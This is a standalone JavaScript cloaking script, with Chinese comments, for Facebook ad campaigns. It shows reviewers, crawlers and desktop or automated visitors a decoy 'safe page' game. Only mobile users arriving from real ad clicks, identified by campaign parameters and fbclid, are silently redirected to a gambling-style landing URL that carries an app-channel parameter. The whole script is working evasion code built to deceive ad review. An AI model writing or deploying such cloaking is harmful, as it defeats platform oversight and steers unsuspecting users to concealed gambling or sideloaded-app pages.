(function() {
    // 【1. 配置：你的落地页主地址】
    var landing_page = "https://www.goldenslot11.com/13/?p0=1uk61sz6";

    function getQueryParam(name) {
        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
        var r = window.location.search.substr(1).match(reg);
        if (r != null) return decodeURIComponent(r[2]).trim();
        return "";
    }

    function shouldRedirect() {
        var search = window.location.search.toLowerCase();
        var ua = navigator.userAgent.toLowerCase();

        // --- A. 基础过滤 ---
        // 拦截未解析的占位符 {{...}}
        if (search.indexOf('{{') > -1 || search.indexOf('%7b%7b') > -1) return false;
        // 强制移动端
        if (!/android|iphone|ipad|ipod/.test(ua)) return false;
        // 拦截 Facebook 爬虫
        if (ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('facebot') > -1) return false;
        // 拦截自动化工具
        if (navigator.webdriver) return false;

        // --- B. 核心字段校验 (基于你提供的参数) ---
        // 校验：pixel, apkch, mvpname, campaign, adgroup, creative
        var requiredKeys = ['pixel', 'apkch', 'mvpname', 'campaign', 'adgroup', 'creative'];
        
        for (var i = 0; i < requiredKeys.length; i++) {
            var val = getQueryParam(requiredKeys[i]);
            // 如果任何一个必填字段为空，或者长度过短（防止占位符被错误解析），则不跳
            if (val === "" || val.length < 2) {
                console.log("Missing or invalid field: " + requiredKeys[i]);
                return false;
            }
        }

        // --- C. FB 自动生成的点击 ID 校验 ---
        // fbclid 是 FB 自动追加的，如果是真实点击，这个字段一定存在
        if (getQueryParam('fbclid') === "") return false;

        return true;
    }

    if (shouldRedirect()) {
        document.documentElement.style.display = 'none';
        var connector = landing_page.indexOf('?') > -1 ? '&' : '?';
        // 透传所有参数：pixel, apkch, mvpname, campaign, adgroup, creative, fbclid
        var finalUrl = landing_page + connector + window.location.search.substring(1);
        
        window.location.replace(finalUrl);
        if (window.stop) window.stop();
    } else {
        document.documentElement.style.display = 'block';
        if (typeof init === 'function') init(); // 启动安全页游戏
    }
})();
